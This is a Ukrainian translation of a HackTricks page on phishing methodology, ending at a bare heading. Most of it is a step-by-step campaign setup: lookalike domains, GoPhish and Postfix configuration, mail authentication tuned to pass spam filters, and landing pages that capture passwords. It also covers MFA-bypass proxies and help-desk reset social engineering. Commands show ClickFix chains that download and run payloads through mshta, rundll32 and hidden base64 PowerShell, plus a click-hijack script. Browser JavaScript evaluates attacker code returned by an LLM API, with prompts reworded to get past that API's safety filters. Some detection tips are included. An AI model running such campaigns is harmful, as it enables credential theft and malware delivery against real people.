# Методологія фішингу

{{#include ../../banners/hacktricks-training.md}}

## Методологія

1. Проведіть розвідку жертви
1. Виберіть **домен жертви**.
2. Виконайте базове веб-перерахування, **шукаючи портали входу**, які використовує жертва, і **вирішіть**, який із них ви будете **імперсонувати**.
3. Використайте **OSINT**, щоб **знайти адреси електронної пошти**.
2. Підготуйте середовище
1. **Придбайте домен**, який ви будете використовувати для фішингової оцінки
2. **Налаштуйте записи**, пов’язані з email-сервісом (SPF, DMARC, DKIM, rDNS)
3. Налаштуйте VPS із **gophish**
3. Підготуйте кампанію
1. Підготуйте **шаблон електронного листа**
2. Підготуйте **вебсторінку** для викрадення облікових даних
4. Запустіть кампанію!

## Генерація схожих доменних імен або придбання довіреного домену

### Техніки варіації доменних імен

- **Ключове слово**: доменне ім’я **містить** важливе **ключове слово** оригінального домену (наприклад, zelster.com-management.com).<sup>[[1]](#references)</sup>
- **Дефіс у субдомені**: замініть **крапку на дефіс** у субдомені (наприклад, www-zelster.com).
- **Новий TLD**: той самий домен із використанням **нового TLD** (наприклад, zelster.org)
- **Homoglyph**: він **замінює** літеру в доменному імені на **літери, що мають схожий вигляд** (наприклад, zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** Він **міняє місцями дві літери** в доменному імені (наприклад, zelsetr.com).
- **Singularization/Pluralization**: додає або видаляє «s» у кінці доменного імені (наприклад, zeltsers.com).
- **Omission**: **видаляє одну** з літер доменного імені (наприклад, zelser.com).
- **Repetition:** **повторює одну** з літер доменного імені (наприклад, zeltsser.com).
- **Replacement**: подібно до homoglyph, але менш непомітно. Замінює одну з літер доменного імені, можливо, на літеру, розташовану поруч з оригінальною на клавіатурі (наприклад, zektser.com).
- **Subdomained**: додає **крапку** всередину доменного імені (наприклад, ze.lster.com).
- **Insertion**: **вставляє літеру** в доменне ім’я (наприклад, zerltser.com).
- **Відсутня крапка**: додає TLD до доменного імені (наприклад, zelstercom.com)

**Автоматичні інструменти**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Вебсайти**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Існує **ймовірність, що деякі біти, які зберігаються або передаються, можуть автоматично змінити значення** через різні фактори, як-от сонячні спалахи, космічні промені або апаратні помилки.

Коли цю концепцію **застосовують до DNS-запитів**, можливо, що **домен, отриманий DNS-сервером**, не збігається з доменом, який спочатку запитували.

Наприклад, зміна одного біта в домені «windows.com» може перетворити його на «windnws.com».

Зловмисники можуть **скористатися цим, зареєструвавши кілька доменів із bit-flipping**, схожих на домен жертви. Їхній намір — перенаправити легітимних користувачів до власної інфраструктури.

Додаткову інформацію наведено тут: [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/).<sup>[[10]](#references)[[11]](#references)</sup>

### Придбання довіреного домену

Ви можете виконати пошук на [https://www.expireddomains.net/](https://www.expireddomains.net) простроченого домену, який можна використати.\
Щоб переконатися, що прострочений домен, який ви збираєтеся придбати, **вже має хороші показники SEO**, можна перевірити, як його класифіковано в:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Виявлення адрес електронної пошти

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% безкоштовно)
- [https://phonebook.cz/](https://phonebook.cz) (100% безкоштовно)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Щоб **виявити більше** дійсних адрес електронної пошти або **перевірити ті, які** ви вже виявили, можна перевірити, чи здатні ви здійснити їх brute-force на SMTP-серверах жертви. [Дізнайтеся, як перевіряти/виявляти адреси електронної пошти тут](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Крім того, не забувайте, що якщо користувачі використовують **будь-який вебпортал для доступу до своєї пошти**, можна перевірити, чи є він вразливим до **username brute force**, і за можливості експлуатувати вразливість.

## Налаштування GoPhish

### Встановлення

Завантажити його можна з [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Завантажте та розпакуйте його в `/opt/gophish`, а потім виконайте `/opt/gophish/gophish`\
У виводі буде надано пароль для admin-користувача на порту 3333. Отже, відкрийте цей порт і використайте ці облікові дані, щоб змінити пароль admin-користувача. Можливо, вам знадобиться тунелювати цей порт до локального:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Налаштування

**Налаштування TLS-сертифіката**

До цього кроку ви вже повинні **придбати домен**, який збираєтеся використовувати, і він має **вказувати** на **IP-адресу VPS**, де ви налаштовуєте **gophish**.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Конфігурація пошти**

Почніть встановлення: `apt-get install postfix`

Потім додайте домен до таких файлів:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Також змініть значення таких змінних у файлі /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Наостанок змініть файли **`/etc/hostname`** і **`/etc/mailname`**, вказавши ім’я вашого домену, і **перезапустіть VPS.**

Тепер створіть **DNS A-запис** для `mail.<domain>`, який вказує на **IP-адресу** VPS, а також **DNS MX-запис**, що вказує на `mail.<domain>`

Тепер перевіримо надсилання email:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Налаштування Gophish**

Зупиніть виконання gophish і налаштуймо його.\
Змініть `/opt/gophish/config.json` на наведене нижче (зверніть увагу на використання https):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**Налаштування сервісу gophish**

Щоб створити сервіс gophish, який можна буде автоматично запускати та керувати ним як сервісом, створіть файл `/etc/init.d/gophish` із таким вмістом:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Завершіть налаштування служби та перевірте її, виконавши:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Налаштування поштового сервера та домену

### Зачекайте та будьте легітимними

Чим старший домен, тим менша ймовірність, що його буде виявлено як спам. Тому перед фішинговою оцінкою слід зачекати якомога довше (щонайменше 1 тиждень). Крім того, якщо розмістити сторінку про сектор із доброю репутацією, отримана репутація буде кращою.

Зверніть увагу, що навіть якщо потрібно зачекати тиждень, ви можете завершити все налаштування вже зараз.

### Налаштуйте запис Reverse DNS (rDNS)

Налаштуйте запис rDNS (PTR), який зіставляє IP-адресу VPS з доменним ім’ям.

### Запис Sender Policy Framework (SPF)

Ви повинні **налаштувати запис SPF для нового домену**. Якщо ви не знаєте, що таке запис SPF, [**прочитайте цю сторінку**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Ви можете скористатися [https://www.spfwizard.net/](https://www.spfwizard.net), щоб згенерувати політику SPF (використайте IP-адресу VPS)

![Форма SPF Wizard для генерації запису SPF для фішингового домену](<../../images/image (1037).png>)

Це вміст, який потрібно встановити в записі TXT у домені:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Запис Domain-based Message Authentication, Reporting & Conformance (DMARC)

Ви повинні **налаштувати запис DMARC для нового домену**. Якщо ви не знаєте, що таке запис DMARC, [**прочитайте цю сторінку**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Вам потрібно створити новий DNS TXT-запис, що вказує на ім’я хоста `_dmarc.<domain>`, із таким вмістом:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

Ви повинні **налаштувати DKIM для нового домену**. Якщо ви не знаєте, що таке запис DMARC, [**прочитайте цю сторінку**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Цей посібник базується на: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy).<sup>[[5]](#references)</sup>

> [!TIP]
> Вам потрібно об'єднати обидва значення B64, які генерує ключ DKIM:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Перевірте оцінку конфігурації електронної пошти

Це можна зробити за допомогою [https://www.mail-tester.com/](https://www.mail-tester.com)\
Просто відкрийте сторінку та надішліть електронний лист на адресу, яку вони вам нададуть:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
Ви також можете **перевірити конфігурацію електронної пошти**, надіславши листа на адресу `check-auth@verifier.port25.com` і **прочитавши відповідь** (для цього потрібно буде **відкрити** порт **25** і переглянути відповідь у файлі _/var/mail/root_, якщо ви надсилаєте листа від імені root).\
Переконайтеся, що ви проходите всі тести:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
Ви також можете надіслати **повідомлення до Gmail під вашим контролем** і перевірити **заголовки електронного листа** у вашій скриньці Gmail — у полі заголовка `Authentication-Results` має бути присутнє `dkim=pass`.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Видалення з чорного списку Spamhaus

Сторінка [www.mail-tester.com](https://www.mail-tester.com) може повідомити, чи блокується ваш домен Spamhaus. Ви можете надіслати запит на видалення вашого домену/IP за адресою: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Видалення з чорного списку Microsoft

​​Ви можете надіслати запит на видалення вашого домену/IP за адресою [https://sender.office.com/](https://sender.office.com).

## Створення та запуск кампанії GoPhish

### Профіль надсилання

- Вкажіть **назву для ідентифікації** профілю відправника
- Вирішіть, з якого облікового запису ви надсилатимете phishing emails. Варіанти: _noreply, support, servicedesk, salesforce..._
- Поля імені користувача та пароля можна залишити порожніми, але обов’язково встановіть прапорець Ignore Certificate Errors

![Створення та запуск кампанії GoPhish - Профіль надсилання: поля імені користувача та пароля можна залишити порожніми, але обов’язково встановіть прапорець Ignore Certificate Errors](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Рекомендується використовувати функцію "**Send Test Email**", щоб перевірити, чи все працює.\
> Я рекомендую **надсилати тестові emails на адреси 10min mail**, щоб уникнути потрапляння до чорного списку під час тестування.

### Шаблон email

- Вкажіть **назву для ідентифікації** шаблону
- Потім напишіть **тему** (нічого незвичайного — просто щось, що ви очікували б побачити у звичайному email)
- Переконайтеся, що встановлено прапорець "**Add Tracking Image**"
- Напишіть **шаблон email** (можна використовувати змінні, як у наведеному нижче прикладі):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Зверніть увагу, що **для підвищення достовірності електронного листа** рекомендується використати підпис із листа клієнта. Варіанти:

- Надішліть лист на **неіснуючу адресу** та перевірте, чи містить відповідь підпис.
- Знайдіть **публічні адреси** на кшталт info@ex.com, press@ex.com або public@ex.com, надішліть їм листа й дочекайтеся відповіді.
- Спробуйте зв’язатися з **якоюсь дійсною знайденою** адресою та дочекайтеся відповіді.

![Sending Profile - Email Template: Try to contact some valid discovered email and wait for the response](<../../images/image (80).png>)

> [!TIP]
> Email Template також дає змогу **додавати файли для надсилання**. Якщо ви також хочете викрадати NTLM challenges за допомогою спеціально створених файлів/документів, [прочитайте цю сторінку](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Вкажіть **ім’я**
- **Напишіть HTML-код** вебсторінки. Зверніть увагу, що вебсторінки можна **імпортувати**.
- Позначте **Capture Submitted Data** та **Capture Passwords**
- Налаштуйте **перенаправлення**

![Email Template - Landing Page: Mark Capture Submitted Data and Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> Зазвичай потрібно змінити HTML-код сторінки та провести локальні тести (можливо, використовуючи Apache server), **доки результат вас не влаштує**. Потім вставте цей HTML-код у поле.\
> Зверніть увагу: якщо для HTML потрібно **використовувати статичні ресурси** (наприклад, деякі CSS- і JS-сторінки), їх можна зберегти в _**/opt/gophish/static/endpoint**_, а потім отримувати до них доступ через _**/static/\<filename>**_

> [!TIP]
> Для перенаправлення можна **перенаправити користувачів на легітимну головну вебсторінку** жертви або, наприклад, перенаправити їх на _/static/migration.html_, розмістити там **індикатор завантаження (**[**https://loading.io/**](https://loading.io)**) на 5 секунд, а потім повідомити, що процес завершено успішно**.

### Users & Groups

- Вкажіть ім’я
- **Імпортуйте дані** (зверніть увагу, що для використання template у цьому прикладі вам потрібні ім’я, прізвище та адреса електронної пошти кожного користувача)

![Landing Page - Users & Groups: Import the data (note that in order to use the template for the example you need the firstname, last name and email address of each user)](<../../images/image (163).png>)

### Campaign

Нарешті створіть campaign, вибравши ім’я, email template, landing page, URL, sending profile та group. Зверніть увагу, що URL буде посиланням, надісланим жертвам.

Зверніть увагу, що **Sending Profile дає змогу надіслати тестовий лист, щоб побачити, як виглядатиме фінальний phishing-лист**:

![Users & Groups - Campaign: Note that the Sending Profile allow to send a test email to see how will the final phishing email looks like](<../../images/image (192).png>)

Коли все буде готово, просто запустіть campaign!

## Клонування вебсайту

Якщо з будь-якої причини ви хочете клонувати вебсайт, перегляньте таку сторінку:


{{#ref}}
clone-a-website.md
{{#endref}}

## Документи та файли з backdoor

Під час деяких phishing-оцінювань (переважно для Red Teams) ви також можете захотіти **надсилати файли, що містять певний backdoor** (можливо, C2 або просто щось, що ініціює authentication).\
Приклади наведено на такій сторінці:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Через Proxy MitM

Попередня атака досить хитра, оскільки ви імітуєте справжній вебсайт і збираєте інформацію, яку вводить користувач. На жаль, якщо користувач ввів неправильний пароль або якщо застосунок, який ви імітували, налаштований із 2FA, **ця інформація не дасть змоги видати себе за обманутого користувача**.

Саме тут корисні такі інструменти, як [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) і [**muraena**](https://github.com/muraenateam/muraena). Цей інструмент дає змогу створити атаку на кшталт MitM. Загалом атака працює так:

1. Ви **імітуєте login**-форму справжньої вебсторінки.
2. Користувач **надсилає** свої **credentials** на вашу fake-сторінку, а інструмент надсилає їх на справжню вебсторінку, **перевіряючи, чи працюють credentials**.
3. Якщо обліковий запис налаштований із **2FA**, MitM-сторінка попросить ввести його, а після того, як **користувач введе** його, інструмент надішле його на справжню вебсторінку.
4. Після authentication користувача ви (як attacker) матимете **перехоплені credentials, 2FA, cookie та будь-яку інформацію** про кожну взаємодію під час роботи інструмента в режимі MitM.

### Через VNC

Що, якби замість **перенаправлення жертви на malicious-сторінку** з таким самим виглядом, як у оригінальної, ви перенаправили її до **VNC-сесії з браузером, підключеним до справжньої вебсторінки**? Ви зможете бачити, що вона робить, викрасти пароль, використаний MFA, cookie...\
Це можна зробити за допомогою [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC).<sup>[[3]](#references)[[4]](#references)</sup>

## Виявлення виявлення

Очевидно, один із найкращих способів дізнатися, чи вас викрили, — **перевірити свій домен у blacklists**. Якщо він там є, це означає, що ваш домен якимось чином було розпізнано як підозрілий.\
Один із простих способів перевірити, чи є ваш домен у будь-якому blacklist, — скористатися [https://malwareworld.com/](https://malwareworld.com)

Однак існують й інші способи дізнатися, чи **жертва активно шукає підозрілу phishing-активність у мережі**, як пояснюється тут:


{{#ref}}
detecting-phising.md
{{#endref}}

Ви можете **придбати домен із дуже схожою назвою** на домен жертви **та/або згенерувати certificate** для **subdomain** домену під вашим контролем, що **міститиме** **keyword** домену жертви. Якщо **жертва** виконає з ними будь-яку **DNS- або HTTP-взаємодію**, ви дізнаєтеся, що вона **активно шукає** підозрілі домени, і вам потрібно буде бути дуже непомітними.<sup>[[2]](#references)</sup>

### Оцінювання phishing

Використовуйте [**Phishious** ](https://github.com/Rices/Phishious), щоб оцінити, чи потрапить ваш лист до spam-папки, чи його буде заблоковано, або ж він пройде успішно.

## Компрометація ідентичності з безпосередньою взаємодією (скидання MFA через Help-Desk)

Сучасні intrusion sets дедалі частіше повністю оминають email lures і **безпосередньо атакують workflow service-desk / identity-recovery**, щоб обійти MFA. Атака повністю працює за принципом "living-off-the-land": отримавши дійсні credentials, operator переміщується за допомогою вбудованих admin tools — malware не потрібне.<sup>[[6]](#references)</sup>

### Attack flow
1. Проведіть розвідку жертви
* Зберіть особисті та корпоративні відомості з LinkedIn, data breaches, public GitHub тощо.
* Визначте identities високої цінності (керівники, IT, finance) та з’ясуйте **точний процес help-desk** для скидання password / MFA.
2. Соціальна інженерія в реальному часі
* Зателефонуйте, напишіть у Teams або чатіться з help-desk, видаючи себе за ціль (часто зі **spoofed caller-ID** або **cloned voice**).
* Надайте раніше зібрані PII, щоб пройти knowledge-based verification.
* Переконайте agent **скинути MFA secret** або виконати **SIM-swap** зареєстрованого мобільного номера.
3. Негайні дії після отримання доступу (≤60 хв у реальних випадках)
* Створіть foothold через будь-який web SSO portal.
* Перелічіть AD / AzureAD за допомогою built-ins (без розгортання binaries):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Виконуйте lateral movement за допомогою **WMI**, **PsExec** або легітимних **RMM** agents, які вже додані до allowlist у середовищі.

### Виявлення та пом’якшення
* Розглядайте identity recovery через help-desk як **privileged operation** — вимагайте step-up auth і схвалення manager.
* Розгорніть правила **Identity Threat Detection & Response (ITDR)** / **UEBA**, які сповіщають про:
* Зміну MFA method + authentication із нового device / geo.
* Негайне підвищення привілеїв того самого principal (user-→-admin).
* Записуйте help-desk calls і вимагайте **call-back на вже зареєстрований номер** перед будь-яким reset.
* Реалізуйте **Just-In-Time (JIT) / Privileged Access**, щоб щойно скинуті accounts **не успадковували автоматично tokens із високими привілеями**.

---

## Deception у масштабі — SEO Poisoning і кампанії "ClickFix"
Commodity crews компенсують витрати на high-touch operations масовими атаками, перетворюючи **search engines та ad networks на канал доставки**.<sup>[[6]](#references)</sup>

1. **SEO poisoning / malvertising** просуває fake result, наприклад `chromium-update[.]site`, на перше місце в search ads.
2. Жертва завантажує невеликий **first-stage loader** (часто JS/HTA/ISO). Приклади, помічені Unit 42:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Loader ексфільтрує browser cookies + credential DBs, а потім завантажує **silent loader**, який у *realtime* вирішує, що розгорнути:
* RAT (наприклад, AsyncRAT, RustDesk)
* ransomware / wiper
* persistence component (registry Run key + scheduled task)

### Поради з hardening
* Блокуйте newly-registered domains і застосовуйте **Advanced DNS / URL Filtering** до *search ads*, а також до e-mail.
* Обмежте інсталяцію software підписаними MSI / Store packages, забороніть виконання `HTA`, `ISO`, `VBS` за policy.
* Відстежуйте дочірні процеси browsers, які відкривають installers:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Полюйте на LOLBins, якими часто зловживають first-stage loaders (наприклад, `regsvr32`, `curl`, `mshta`).

### Перехоплення натискання кнопки завантаження з передачею до TDS
Деякі fake software portals залишають видимий `href` завантаження спрямованим на **справжню URL-адресу GitHub/release**, але перехоплюють **першу** взаємодію користувача через JavaScript і натомість спрямовують жертву в ланцюжок **Traffic Distribution System (TDS)**.<sup>[[9]](#references)</sup>
```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
if (!isEligibleClick(e.target)) return;
cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
e.stopImmediatePropagation();
e.preventDefault();
}, true);
```
Ключові ознаки:
- Hook зазвичай запускається у **capture phase** (`true`) на `document`, тому спрацьовує до обробників сайту.
- Chrome часто використовує `mousedown` замість `click`, щоб зберегти redirect прив’язаним до дійсного **user gesture** і підвищити ймовірність обходу блокувальника спливаючих вікон.
- Деякі варіанти заздалегідь відкривають `about:blank` або імітують кліки `<a target="_blank">`, а URL TDS призначають лише пізніше.
- Обмеження на стороні браузера часто зберігаються в `localStorage`, тому **перший клік** може привести до malware, тоді як після оновлення сторінки або повторних спроб відбувається перехід за видимим посиланням, що виглядає нешкідливо.
- TDS може фільтрувати за referrer, доменом входу, GEO, browser/device fingerprint, перевірками VPN/datacenter, контекстом кліку та лічильниками для кожної сесії, через що повторне відтворення аналітиком може бути непередбачуваним.

Ідеї для захисників:
- Порівнюйте **відображений** `href` із **фактичною** ціллю навігації, яка генерується під час кліку.
- Шукайте обробники `document.addEventListener(..., true)`, які викликають одночасно `preventDefault()` і `stopImmediatePropagation()` у зв’язці з `window.open`, `about:blank` або імітованими кліками anchor.
- Розглядайте кластери нещодавно зареєстрованих доменів для завантаження ПЗ, які всі завантажують однаковий CloudFront/JS stage, як високосигнальний патерн SEO-poisoning/TDS.

### ClickFix із фальшивих сторінок перевірки + завантаження LOLBAS, що виглядають як архіви
Деякі гілки TDS завершуються фальшивою сторінкою перевірки (у стилі Cloudflare/IUAM), яка вказує жертві запустити довірений Windows binary, наприклад:<sup>[[9]](#references)</sup>
```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```
Примітки:
- `mshta.exe` виконує **HTA/VBScript на початку відповіді**, навіть якщо URL видає себе за архів `.7z`; додані дані архіву можуть бути лише приманкою.
- Подальші етапи часто продовжують брехати щодо типу файлу (`.rtf` для PowerShell, `.asar` для Python, ZIP-архіви з доповненими бінарними файлами), а потім переходять до **ручного відображення PE / виконання в пам’яті**.
- Якщо ви реагуєте на один із таких ланцюжків, зберігайте **мережеві дані та дані з пам’яті від першого успішного запуску**: під час наступних відтворень може відображатися лише нешкідливий шлях інсталятора/SFX або виникати збій, оскільки вивільнення payload/ключа було прив’язане до оригінальної сесії TDS.

### Практика доставки DLL через ClickFix (підроблене оновлення CERT)
* Приманка: клонована рекомендація національного CERT із кнопкою **Update**, яка показує покрокові інструкції щодо «виправлення». Жертвам пропонують запустити batch-файл, що завантажує DLL і виконує її через `rundll32`.<sup>[[12]](#references)</sup>
* Типовий ланцюжок batch-файлу:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest` записує payload до `%TEMP%`, коротка затримка приховує мережеву нестабільність, після чого `rundll32` викликає експортовану точку входу (`notepad`).
* DLL надсилає ідентифікаційні дані хоста та кожні кілька хвилин опитує C2. Віддалені завдання надходять як **закодований у base64 PowerShell**, який виконується приховано та з обходом політик:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* Це зберігає гнучкість C2 (сервер може змінювати завдання без оновлення DLL) і приховує вікна консолі. Шукайте дочірні процеси PowerShell у `rundll32.exe`, які одночасно використовують `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression`.
* Захисники можуть шукати HTTP(S)-зворотні виклики у формі `...page.php?tynor=<COMPUTER>sss<USER>` та інтервали опитування у 5 хвилин після завантаження DLL.

---

## Фішингові операції з використанням AI
Зловмисники тепер поєднують **LLM та voice-clone API** для повністю персоналізованих приманок і взаємодії в реальному часі.

| Рівень | Приклад використання з боку threat actor |
|-------|-------------|
|Автоматизація|Генерація та надсилання понад 100 тис. email/SMS із рандомізованими формулюваннями та tracking links.|
|Generative AI|Створення *одноразових* email-повідомлень із посиланнями на публічні M&A, внутрішні жарти із соціальних мереж; deep-fake голос CEO у callback scam.|
|Agentic AI|Автономна реєстрація доменів, збір open-source intel, підготовка email-повідомлень наступного етапу, коли жертва натискає посилання, але не надсилає облікові дані.|

**Захист:**
• Додавайте **динамічні банери**, що виділяють повідомлення, надіслані ненадійною автоматизацією (через аномалії ARC/DKIM).
• Запроваджуйте **challenge-фрази з voice-biometric перевіркою** для телефонних запитів із високим ризиком.
• Постійно моделюйте приманки, згенеровані AI, у програмах підвищення обізнаності — статичні шаблони застаріли.

Див. також — зловживання agentic browsing для credential phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Див. також — зловживання AI agent локальними CLI tools і MCP (для інвентаризації secrets та виявлення):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## Runtime-складання фішингового JavaScript за допомогою LLM (генерація коду в браузері)

Зловмисники можуть надсилати HTML, що виглядає нешкідливо, і **генерувати stealer під час виконання**, запитуючи JavaScript у **довіреного LLM API**, а потім виконуючи його в браузері (наприклад, через `eval` або динамічний `<script>`).<sup>[[8]](#references)</sup>

1. **Prompt-as-obfuscation:** кодуйте URL для exfil/Base64-рядки в prompt; ітеративно змінюйте формулювання, щоб обходити safety filters і зменшувати кількість hallucinations.
2. **Client-side API call:** під час завантаження JS викликає публічний LLM (Gemini/DeepSeek тощо) або CDN proxy; у статичному HTML присутні лише prompt/API call.
3. **Assemble & exec:** об’єднуйте відповідь і виконуйте її (поліморфно під час кожного відвідування):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** згенерований код персоналізує lure (наприклад, розбір токенів LogoKit) і надсилає creds до endpoint, прихованого в prompt.

**Evasion traits**
- Traffic проходить через добре відомі LLM domains або надійні CDN proxies; іноді через WebSockets до backend.
- Відсутній static payload; malicious JS існує лише після render.
- Non-deterministic generations створюють **унікальні stealers** для кожної сесії.

**Detection ideas**
- Запускайте sandboxes із увімкненим JS; виявляйте **runtime `eval`/dynamic script creation, джерелом яких є відповіді LLM**.
- Шукайте front-end POSTs до LLM APIs, за якими одразу виконуються `eval`/`Function` над отриманим текстом.
- Створюйте alert для unsanctioned LLM domains у client traffic із подальшими credential POSTs.

---

## MFA Fatigue / Push Bombing Variant – Примусове скидання
